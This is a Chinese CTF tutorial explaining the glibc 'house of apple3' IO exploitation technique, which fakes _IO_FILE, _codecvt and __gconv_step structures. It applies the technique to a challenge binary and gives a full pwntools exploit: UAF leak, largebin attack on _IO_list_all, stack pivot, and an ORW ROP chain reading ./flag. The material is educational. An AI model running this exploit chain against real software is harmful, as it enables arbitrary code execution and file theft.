# house of apple3

### house of apple3介绍：

> house of apple3 是[roderick](https://bbs.kanxue.com/user-> home-956675.htm)师傅提出的可适用于高版本glibc的IO攻击方法，和house of apple2一样是一套完整的控制程序流的打法
>
> house of apple2 通过伪造_wide_data 结构体去控制程序执行流，而house of
> apple3则是通过伪造_IO_FILE中的_codecvt来控制程序执行流，可以保持_wide_data为默认值，若要控制rsi，则也可伪造_wide_data为可控堆地址
>
> roderick师傅一共给了_IO_wfile_underflow 函数控制程序执行流、
>
> _IO_wfile_underflow_mmap 函数控制程序执行流、_IO_wfile_sync 函数控制程序执行流
> 3条调用链，都是通过对vtable和_codecvt的伪造来进行攻击，我们具体分析利用一下其中的第一条调用链

‍

#### **适用版本：**

> glibc 2.23 -- 至今

‍

#### 利用条件:

>   * 可以进行一次任意地址写（通常是largebin attack）
>   * 可以触发 IO 流操作（包括但不限于：从​main​​函数返回、调用​exit​​函数、通过​__malloc_assert​​触发）
>

‍

#### 源码分析：

利用`_IO_wfile_underflow`​ 函数控制程序执行流的调用链：

​`_IO_wfile_underflow -> __libio_codecvt_in -> DL_CALL_FCT ->
(fp->_codecvt->__cd_in.step) -> (gs->__fct)(gs)`​

‍

在 **_IO_FILE_plus结构体** 0x98偏移处存在一个结构体`_codecvt`​

    
    
    pwndbg> p *(struct _IO_FILE_plus *) 0x7ffff7fa85c0
    $16 = {
      file = {
        _flags = 0,
        _IO_read_ptr = 0x7ffff7fa8643 <_IO_2_1_stderr_+131> "",
        _IO_read_end = 0xffffffffffffffff <error: Cannot access memory at address 0xffffffffffffffff>,
        _IO_read_base = 0x7ffff7fa8643 <_IO_2_1_stderr_+131> "",
        _IO_write_base = 0x7ffff7fa8643 <_IO_2_1_stderr_+131> "",
        _IO_write_ptr = 0x7ffff7fa8643 <_IO_2_1_stderr_+131> "",
        _IO_write_end = 0x7ffff7fa8643 <_IO_2_1_stderr_+131> "",
        _IO_buf_base = 0x7ffff7fa8643 <_IO_2_1_stderr_+131> "",
        _IO_buf_end = 0x7ffff7fa8644 <_IO_2_1_stderr_+132> "",
        _IO_save_base = 0x0,
        _IO_backup_base = 0x0,
        _IO_save_end = 0x0,
        _markers = 0x0,
        _chain = 0x7ffff7fa86a0 <_IO_2_1_stdout_>,
        _fileno = 2,
        _flags2 = 0,
        _old_offset = -1,
        _cur_column = 0,
        _vtable_offset = 0 '\000',
        _shortbuf = "",
        _lock = 0x7ffff7fa97d0 <_IO_stdfile_2_lock>,
        _offset = -1,
        _codecvt = 0x0, #在这里捏
        _wide_data = 0x7ffff7fa7780 <_IO_wide_data_2>,
        _freeres_list = 0x0,
        _freeres_buf = 0x0,
        __pad5 = 0,
        _mode = 0,
        _unused2 = '\000' <repeats 19 times>
      },
      vtable = 0x7ffff7fa3f20 <_IO_wfile_jumps_mmap+128> #_IO_wfile_jumps_addr-0x40
    }
    

查看 **结构体_IO_codecvt** 源码：

    
    
    // libio\libio.h:115
    struct _IO_codecvt
    {
      _IO_iconv_t __cd_in; //
      _IO_iconv_t __cd_out; //
    };
    

​`__cd_in`​和`__cd_out`​为同一类型的数据

查看 **结构体_IO_iconv_t** 源码：

    
    
    // libio\libio.h:51
    typedef struct
    {
      struct __gconv_step *step; //
      struct __gconv_step_data step_data;
    } _IO_iconv_t;
    

查看 **结构体__gconv_step** 源码：

    
    
    // iconv\gconv.h:84
    /* Description of a conversion step.  */
    struct __gconv_step
    {
      struct __gconv_loaded_object *__shlib_handle;
      const char *__modname;
    
      /* For internal use by glibc.  (Accesses to this member must occur
         when the internal __gconv_lock mutex is acquired).  */
      int __counter;
    
      char *__from_name;
      char *__to_name;
    
      __gconv_fct __fct; // 第一种调用链我们关注这个成员
      __gconv_btowc_fct __btowc_fct;
      __gconv_init_fct __init_fct;
      __gconv_end_fct __end_fct;
    
      /* Information about the number of bytes needed or produced in this
         step.  This helps optimizing the buffer sizes.  */
      int __min_needed_from;
      int __max_needed_from;
      int __min_needed_to;
      int __max_needed_to;
    
      /* Flag whether this is a stateful encoding or not.  */
      int __stateful;
    
      void *__data;     /* Pointer to step-local data.  */
    };
    

对 **__gconv_fct** 的定义：

    
    
    /* Type of a conversion function.  */
    typedef int (*__gconv_fct) (struct __gconv_step *, struct __gconv_step_data *,
                    const unsigned char **, const unsigned char *,
                    unsigned char **, size_t *, int, int);
    

> ‍

​`_IO_wfile_underflow`​函数是`_IO_wfile_jumps`​的成员，我们可以通过劫持vtable为`_IO_jump_t`​
类型变量`_IO_wfile_jumps`​加减偏移来调用`_IO_wfile_underflow`​

在`_IO_wfile_underflow`​ 函数中我们可以调用`__libio_codecvt_in`​，需要绕过前三个if判断，满足第四个if判断

    
    
    wint_t
        _IO_wfile_underflow (FILE *fp)
    {
        struct _IO_codecvt *cd;
        enum __codecvt_result status;
        ssize_t count;
    
        /* C99 requires EOF to be "sticky".  */
    
        if (fp->_flags & _IO_EOF_SEEN)
            return WEOF;
        if (__glibc_unlikely (fp->_flags & _IO_NO_READS))
        {
            fp->_flags |= _IO_ERR_SEEN;
            __set_errno (EBADF);
            return WEOF;
        }
        if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)
            return *fp->_wide_data->_IO_read_ptr;
    
        cd = fp->_codecvt;
        /* Maybe there is something left in the external buffer.  */
        if (fp->_IO_read_ptr < fp->_IO_read_end) //满足这个
        {
            /* There is more in the external.  Convert it.  */
            const char *read_stop = (const char *) fp->_IO_read_ptr;
    
            fp->_wide_data->_IO_last_state = fp->_wide_data->_IO_state;
            fp->_wide_data->_IO_read_base = fp->_wide_data->_IO_read_ptr =
                fp->_wide_data->_IO_buf_base;
            status = __libio_codecvt_in (cd, &fp->_wide_data->_IO_state,
                                         fp->_IO_read_ptr, fp->_IO_read_end,
                                         &read_stop,
                                         fp->_wide_data->_IO_read_ptr,
                                         fp->_wide_data->_IO_buf_end,
                                         &fp->_wide_data->_IO_read_end);
            ......
        }
    }
    

查看 **__libio_codecvt_in** ：

第8行，可以看到`gs`​被`codecvt->__cd_in.step`​，也就是第一个参数赋值

第19行，若`gs->__shlib_handle`​为空，则不会调用`__pointer_guard`​解密

第22行，`DL_CALL_FCT`​宏会调用`fct(gs, ...)`​

    
    
    enum __codecvt_result
        __libio_codecvt_in (struct _IO_codecvt *codecvt, __mbstate_t *statep,
                            const char *from_start, const char *from_end,
                            const char **from_stop,
                            wchar_t *to_start, wchar_t *to_end, wchar_t **to_stop)
    {
        enum __codecvt_result result;
        struct __gconv_step *gs = codecvt->__cd_in.step; 
        int status;
        size_t dummy;
        const unsigned char *from_start_copy = (unsigned char *) from_start;
    
        codecvt->__cd_in.step_data.__outbuf = (unsigned char *) to_start;
        codecvt->__cd_in.step_data.__outbufend = (unsigned char *) to_end;
        codecvt->__cd_in.step_data.__statep = statep;
    
        __gconv_fct fct = gs->__fct;
        #ifdef PTR_DEMANGLE
        if (gs->__shlib_handle != NULL)
            PTR_DEMANGLE (fct);
        #endif
        status = DL_CALL_FCT (fct,
                              (gs, &codecvt->__cd_in.step_data, &from_start_copy,
                               (const unsigned char *) from_end, NULL,
                               &dummy, 0, 0));
        ......
    }
    

这样我们的攻击方法就出来了

‍

#### 攻击方法：

>   * 获取`libc`​地址和`heap`​地址
>   * 劫持`_IO_FILE`​为可控堆地址A，开始对`_IO_FILE`​伪造布置
>   * 首先`_flags`​设置为`~(4 |
> 0x10)`​，不过因为劫持`_IO_FILE`​的可控堆地址A基本都是设置为`chunk`​起始地址，A(0x~290)即是`chunk`​的`pre_size`​，只要保证上一个`chunk`​的数据没有填到这里即可
>
> pwndbg> x/10gx 0x555555559290  
>  0x555555559290: 0x0000000000000000 0x0000000000000211  
>  0x5555555592a0: 0x00005555555594b0 0x0000000000000000  
>  0x5555555592b0: 0x0000000000000000 0x0000000000000000
>
>   * 篡改`vtable`​为`_IO_wfile_jump`​加减偏移，使其能够调用`_IO_wfile_underflow`​
>   * 因为要满足`_IO_wfile_underflow`​ 函数中调用`__libio_codecvt_in`​的`fp->_IO_read_ptr
> < fp->_IO_read_end`​条件，保证`*(A+0x8) <
> *(A+0x10)`​即可，因为`(A+0x8)`​储存的是`chunk`​的`size`​，而`(A+0x10)`​是main_arena地址，所以条件也是容易满足的
>   * 篡改`_codecvt`​为可控堆地址B，对其伪造布置
>   * ​`codecvt->__cd_in.step`​，布置地址B指向可控堆地址C，即`_codecvt`​第一个参数为C
>   * 为满足`gs->__shlib_handle`​为空，绕过`__pointer_guard`​，将*C布置为0
>   *
> ​`codecvt->__cd_in.step->__fct`​处，即C+0x28处布置指向地址D，控制rip；此时的rdi为地址C；若想控制rsi，可以布置`_wide_data`​
>   * 触发 IO 流操作
>

依据roderick师傅写的demo，我们直接看对`_codecvt`​的伪造

​`stderr->codecvt->__cd_in.step`​：将_codecvt劫持为可控堆地址B，B指向地址C

    
    
    '''
    创建两个0x200大小的堆块
    addr                prev                size                 status              fd                bk            
    0x555555559000      0x0                 0x290                Used                None              None
    0x555555559290      0x0                 0x210                Used                None              None    p1
    0x5555555594a0      0x0                 0x210                Used                None              None    p2
    '''
    
    
    pwndbg> x/10gx 0x555555559290
    0x555555559290: 0x0000000000000000  0x0000000000000211
    0x5555555592a0: 0x00005555555594b0  0x0000000000000000
    0x5555555592b0: 0x0000000000000000  0x0000000000000000
    
    pwndbg> p *codecvt
    $4 = {
      __cd_in = {
        step = 0x5555555594b0,
        step_data = {
          __outbuf = 0x0,
          __outbufend = 0x0,
          __flags = 0,
          __invocation_counter = 0,
          __internal_use = 0,
          __statep = 0x7ffff7fa77d8 <_IO_wide_data_2+88>,
          __state = {
            __count = 0,
            __value = {
              __wch = 0,
              __wchb = "\000\000\000"
            }
          }
        }
      },
      __cd_out = {
        step = 0x0,
        step_data = {
          __outbuf = 0x0,
          __outbufend = 0x0,
          __flags = 0,
          __invocation_counter = 0,
          __internal_use = 0,
          __statep = 0x0,
          __state = {
            __count = 0,
            __value = {
              __wch = 0,
              __wchb = "\000\000\000"
            }
          }
        }
      }
    }
    

‍

​`stderr->codecvt->__cd_in.step->__fct`​：C处布置为0绕过​`__pointer_guard`​，C+0x28处布置指向地址D
(backdoor)

    
    
    pwndbg> x/10gx 0x5555555594a0
    0x5555555594a0: 0x0000000000000000  0x0000000000000211
    0x5555555594b0: 0x0000000000000000  0x0000000000000000
    0x5555555594c0: 0x0000000000000000  0x0000000000000000
    0x5555555594d0: 0x0000000000000000  0x00005555555551d9
    
    pwndbg> p  *gs
    $5 = {
      __shlib_handle = 0x0,
      __modname = 0x0,
      __counter = 0,
      __from_name = 0x0,
      __to_name = 0x0,
      __fct = 0x5555555551d9 <backdoor>,
      __btowc_fct = 0x0,
      __init_fct = 0x0,
      __end_fct = 0x0,
      __min_needed_from = 0,
      __max_needed_from = 0,
      __min_needed_to = 0,
      __max_needed_to = 0,
      __stateful = 0,
      __data = 0x0
    }
    

触发IO流操作，进而getshell

    
    
    fflush(stderr);
    

> _IO_wfile_underflow
>
> __libio_codecvt_in
>
> backdoor

‍

‍

### 例题pwn_one

例题和apple2所用的一样的pwn_one

开了这个沙箱可以考虑orw或mprotect+shellcode，程序保护全开

​  
![](./img/3769855644593717803.png)  
​

‍

##### 程序分析：

​  
![](./img/6879728697927820148.png)  
​

首先程序会要求你输入一个在6-10之间的值赋给key，这个key是我们能申请多大堆块的依据

‍

**add:**

​  
![](./img/2094632879147854114.png)  
​

可以申请3种大小的堆块：

key✖0x110大小

key✖0x110+0x10大小

2✖key✖0x110大小

总的范围在0x660-0x1540，申请的都是largebin大小的堆块

‍

**delete:**

​  
![](./img/6741723355280996562.png)  
​

存在UAF漏洞

‍

**edit:**

​  
![](./img/2451980610412680198.png)  
​

​  
![](./img/3033902158315436047.png)  
​

只有一次编辑机会，执行完内容的read后unk_202010将被赋0，不再满足进入edit的if判断

‍

**show:**

​  
![](./img/2372109681533022354.png)  
​

只有一次泄露机会，且只能泄露0x10大小的数据

‍

##### 利用详解：

>   * **libc地址和heap地址的获取**
>   * **伪造IO结构体，布置栈迁移**
>   * **largebin attack，劫持_IO_list_all变量**
>   * **exit退出，触发IO调用**
>

**libc地址和heap地址的获取：**

    
    
    ru('enter your key >>\n')
    sl('8')
    
    add(2) #0
    add(1) #1
    add(1) #2
    add(1) #3
    
    delete(0)
    delete(2)
    
    show(0)
    libc_base=l64()-0x1f2cc0
    li('libc_base = '+hex(libc_base))
    
    ru('\x00\x00')
    heap_base=u64(r(8).ljust(8,b"\x00"))-0x13c0
    li('heap_base = '+hex(heap_base))
    

前面是常规的地址泄露

‍

**伪造IO结构体，布置栈迁移：**

重点是下面结构体的伪造和栈迁移的布置

    
    
    magic_gadget = libc_base + libc.sym['svcudp_reply'] + 0x1a
    chain=libc_base+0x1f3760
    lock=libc_base+0x1f5720
    wide_data=libc_base+0x1f2880
    wfile = libc_base + libc.sym['_IO_wfile_jumps']
    add_18=libc_base+0x000000000003b3b9
    
    add(1) #chunk0->largebin
    delete(2) #chunk2->ub
    
    pl=p64(0)+p64(leave_ret)+p64(0)+p64(io_all-0x20) 
    pl+=p64(0)*7
    pl+=p64(chain)
    pl+=p64(0)*3
    pl+=p64(lock)
    pl+=p64(0)
    pl+=p64(chunk0+0xe0)
    pl+=p64(wide_data)
    pl+=p64(0)*6
    pl+=p64(wfile+8)
    
    pl+=p64(chunk0+0xf0)
    pl+=p64(0)*6
    pl+=p64(magic_gadget)
    
    pl+=p64(0)*2
    pl+=p64(add_18) #add rsp(0x3b8),0x18... --> orw!!! 
    pl+=p64(chunk0+0x140-0x18) #leave_ret
    pl+=p64(chunk0-0x10)
    
    #open
    orw = b'./flag\x00\x00'
    orw += p64(pop_rdx12) + p64(0) + p64(chunk0+0x30)
    orw += p64(pop_rdi) + p64(orw_addr)
    orw += p64(pop_rsi) + p64(0)
    orw += p64(open_addr)
    #read
    orw += p64(pop_rdi) + p64(3)
    orw += p64(pop_rsi) + p64(orw_addr + 0x100)
    orw += p64(pop_rdx12) + p64(0x50) + p64(0)
    orw += p64(read_addr)
    #puts
    orw += p64(pop_rdi) + p64(orw_addr + 0x100)
    orw += p64(puts_addr)
    pl+=orw
    
    edit(0,pl.ljust(0x880,b'\x00'))
    

**拆解一下上面这部分：**

    
    
    pl=p64(0)+p64(leave_ret)+p64(0)+p64(io_all-0x20)
    

> chunk0(0x~290) + 0x18布置为leave_ret，后面栈迁移会用到
>
> bk_nextsize布置为io_all-0x20，以劫持_IO_list_all

​  
![](./img/2834400332328476286.png)  
​

‍

    
    
    chain=libc_base+0x1f3760
    lock=libc_base+0x1f5720
    wide_data=libc_base+0x1f2880
    wfile = libc_base + libc.sym['_IO_wfile_jumps']
    
    pl+=p64(0)*7
    pl+=p64(chain)
    pl+=p64(0)*3
    pl+=p64(lock)
    pl+=p64(0)
    pl+=p64(chunk0+0xe0)
    pl+=p64(wide_data)
    pl+=p64(0)*6
    pl+=p64(wfile+8) #_IO_wfile_underflow
    
    pl+=p64(chunk0+0xf0)
    pl+=p64(0)*6
    pl+=p64(magic_gadget)
    

> 对chain、lock、wide_data变量进行了保留
>
> vtable设置为wfile+8，使其能够调用_IO_wfile_underflow

​  
![](./img/6408847021026652181.png)  
​

> 将codecvt篡改为可控堆地址，这里我们修改为chunk0+0xe0，它指向我们布置的pl+=p64(chunk0+0xf0)部分
>
> (chunk0+0xf0)+0x28处布置为magic_gadget

​  
![](./img/6071599750644558636.png)

​​  
![](./img/6639382256114777898.png)

​

    
    
    pl+=p64(0)*2
    pl+=p64(add_18) #add rsp(0x3b8),0x18... --> orw!!! 
    pl+=p64(chunk0+0x140-0x18) #leave_ret
    pl+=p64(chunk0-0x10)
    

> # mov rbp, qword ptr [rdi + 0x48]
>
> ( **chunk0+0xf0** +0x48)处我们布置为了chunk0+0x140-0x18
>
> # mov rax, qword ptr [rbp + 0x18]
>
> ( **chunk0+0x140-0x18** +0x18)处我们布置为了chunk0-0x10
>
> # call qword ptr [rax + 0x28]
>
> ( **chunk0-0x10** +0x28)指向leave_ret

​  
![](./img/6871322798932336579.png)

leave_ret栈迁移，自此我们完整控制了程序流

​  
![](./img/4933910140604228451.png)  
​

但为了执行到我们布置的orw地址，我们还要先利用gadget对rsp进行加0x18的操作

> shu@shu-virtual-machine:~/pwn/all/house of apple/pwn_oneday3$ ROPgadget
> --binary libc.so.6 --only "add|ret" | grep "rsp"

​​  
![](./img/4960873485574132493.png)  
​​

​  
![](./img/7984984279003363773.png)

**orw的构造：**

    
    
    #open
    orw = b'./flag\x00\x00'
    orw += p64(pop_rdx12) + p64(0) + p64(chunk0+0x30)
    orw += p64(pop_rdi) + p64(orw_addr)
    orw += p64(pop_rsi) + p64(0)
    orw += p64(open_addr)
    #read
    orw += p64(pop_rdi) + p64(3)
    orw += p64(pop_rsi) + p64(orw_addr + 0x100)
    orw += p64(pop_rdx12) + p64(0x50) + p64(0)
    orw += p64(read_addr)
    #puts
    orw += p64(pop_rdi) + p64(orw_addr + 0x100)
    orw += p64(puts_addr)
    pl+=orw
    

**largebin attack，劫持_IO_list_all变量**

下面就是将_IO_list_all劫持为chunk0了

    
    
    add(3) #largebin attack -> _IO_list_all: chunk2
    
    add(1) #recycle chunk2 -> _IO_list_all: chunk0
    

**exit退出，触发IO调用**

    
    
    choice(5)
    

##### 触发流程：

> 从 **exit** 函数步入
>
> ‍
>
> **__run_exit_handlers**
>
> ‍
>
> **_IO_cleanup**
>
> ‍
>
> **_IO_flush_all_lockp**
>
> ‍
>
> **_IO_wfile_underflow**
>
> ‍
>
> **__libio_codecvt_in**
>
> ‍
>
> **svcudp_reply+26**
>
> ‍
>
> **leave_ret** 栈迁移，控制程序流
>
> ‍
>
> **add_18** 跳转到我们布置的orw
>
> ‍
>
> **orw**
>
> ​  
>
> ![](./img/6388233006019649655.png)  
>  ​

‍

‍

‍

‍

##### 完整EXP:

    
    
    #encoding = utf-8
    from pwn import *
    from pwnlib.rop import *
    from pwnlib.context import *
    from pwnlib.fmtstr import *
    from pwnlib.util.packing import *
    from pwnlib.gdb import *
    from ctypes import *
    import os
    import sys
    import time
    import base64
    #from ae64 import AE64
    #from LibcSearcher import * 
    
    context.os = 'linux'
    context.arch = 'amd64'
    #context.arch = 'i386'
    context.log_level = "debug"
    
    
    local = 1
    binary = './pwn'
    ip = '0.0.0.0'
    port = 8888
    libcelf = './libc.so.6'
    ldfile = './ld.so'
    armmips = 0
    x64_32 = 1
    
    
    if x64_32:
        context.arch = 'amd64'
    else:
        context.arch = 'i386'
    
    if armmips==0:
        if local:
            if ldfile:
                p = process([ldfile, binary], env={"LD_PRELOAD":libcelf})
                libc = ELF(libcelf)
            elif libcelf:
                p = process([binary], env={"LD_PRELOAD":libcelf})
                libc = ELF(libcelf)
            else:
                p = process(binary)
        else:
            p = remote(ip,port)
    else:
        if local:
            if x64_32:
                p = process(["qemu-arm", "-g", "1212", "-L", "/usr/arm-linux-gnueabi",binary])
            else:
                p = process(["qemu-aarch64", "-g", "1212", "-L", "/usr/aarch64-linux-gnu/", binary])
        else:
            p = remote(ip,port)
    
    elf = ELF(binary)
    
    s       = lambda data               :p.send(data)
    sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
    sl      = lambda data               :p.sendline(data)
    sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
    r       = lambda num                :p.recv(num)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    itr     = lambda                    :p.interactive()
    uu32    = lambda data,num           :u32(p.recvuntil(data)[-num:].ljust(4,b'\x00'))
    uu64    = lambda data,num           :u64(p.recvuntil(data)[-num:].ljust(8,b'\x00'))
    leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
    l64     = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
    l32     = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
    li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
    ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
    context.terminal = ['gnome-terminal','-x','sh','-c']
    
    def dbg():
       gdb.attach(proc.pidof(p)[0])
       pause()
    
    add_idx = 1
    delete_idx = 2
    show_idx = 4
    edit_idx = 3
    
    
    def choice(cho):
        sla('enter your command: \n',cho)
    
    def add(idx):
        choice(add_idx)
        sla('choise:',idx)
    
    def delete(idx):
        choice(delete_idx)
        sla('Index: \n',idx)
    
    def show(idx):
        choice(show_idx)
        sla('Index: ',idx)
    
    def edit(idx,content):
        choice(edit_idx)
        sla('Index: ',idx)
        p.sendafter('Message: \n',content)
    
    
    ru('enter your key >>\n')
    sl('8')
    
    add(2) #0
    add(1) #1
    add(1) #2
    add(1) #3
    
    delete(0)
    delete(2)
    
    show(0)
    libc_base=l64()-0x1f2cc0
    li('libc_base = '+hex(libc_base))
    
    ru('\x00\x00')
    heap_base=u64(r(8).ljust(8,b"\x00"))-0x13c0
    li('heap_base = '+hex(heap_base))
    
    add(1) #chunk0->largebin
    
    delete(2) #chunk2->ub
    
    pop_rdi = libc_base + libc.search(asm('pop rdi;ret;')).__next__()
    pop_rsi = libc_base + libc.search(asm('pop rsi;ret;')).__next__()
    pop_rdx12 = libc_base + libc.search(asm('pop rdx;pop r12;ret;')).__next__()
    leave_ret = libc_base + libc.search(asm('leave;ret;')).__next__()
    
    open_addr = libc_base + libc.sym['open']
    read_addr = libc_base + libc.sym['read']
    puts_addr = libc_base + libc.sym['puts']
    
    io_all = libc_base + libc.sym['_IO_list_all']
    li('io_all = '+hex(io_all))
    
    chunk0 = heap_base + 0x290 #fake_IO
    magic_gadget = libc_base + libc.sym['svcudp_reply'] + 0x1a
    add_18=libc_base+0x000000000003b3b9
    
    chain=libc_base+0x1f3760
    lock=libc_base+0x1f5720
    wide_data=libc_base+0x1f2880
    wfile = libc_base + libc.sym['_IO_wfile_jumps']
    
    
    
    orw_addr=chunk0+0x148
    #open
    orw = b'./flag\x00\x00'
    orw += p64(pop_rdx12) + p64(0) + p64(chunk0+0x30)
    orw += p64(pop_rdi) + p64(orw_addr)
    orw += p64(pop_rsi) + p64(0)
    orw += p64(open_addr)
    #read
    orw += p64(pop_rdi) + p64(3)
    orw += p64(pop_rsi) + p64(orw_addr + 0x100)
    orw += p64(pop_rdx12) + p64(0x50) + p64(0)
    orw += p64(read_addr)
    #puts
    orw += p64(pop_rdi) + p64(orw_addr + 0x100)
    orw += p64(puts_addr)
    
    pl=p64(0)+p64(leave_ret)+p64(0)+p64(io_all-0x20) 
    pl+=p64(0)*3
    pl+=p64(0)
    pl+=p64(0)*3
    pl+=p64(chain)
    pl+=p64(0)*3
    pl+=p64(lock)
    pl+=p64(0)
    pl+=p64(chunk0+0xe0) #_codecvt
    pl+=p64(wide_data)
    pl+=p64(0)*6
    pl+=p64(wfile+8)
    
    pl+=p64(chunk0+0xf0)
    pl+=p64(0)*6
    pl+=p64(magic_gadget)
    
    pl+=p64(0)*2
    pl+=p64(add_18) #add rsp(0x3b8),0x18... --> orw!!! 
    pl+=p64(chunk0+0x140-0x18) #leave_ret
    pl+=p64(chunk0-0x10)
    
    pl+=orw
    
    edit(0,pl.ljust(0x880,b'\x00'))
    
    add(3) #largebin attack -> _IO_list_all: chunk2
    
    add(1) #recycle chunk2 -> _IO_list_all: chunk0
    
    #dbg()
    choice(5)
    
    itr()
    

​  
![](./img/4073507592970337007.png)  
​

‍

##### 参考：

[House of Apple 一种新的glibc中IO攻击方法 (3) - roderick - record and learn!
(roderickchan.cn)](https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-3/#%E5%88%A9%E7%94%A8_io_wfile_underflow%E5%87%BD%E6%95%B0%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81)

‍

‍

‍

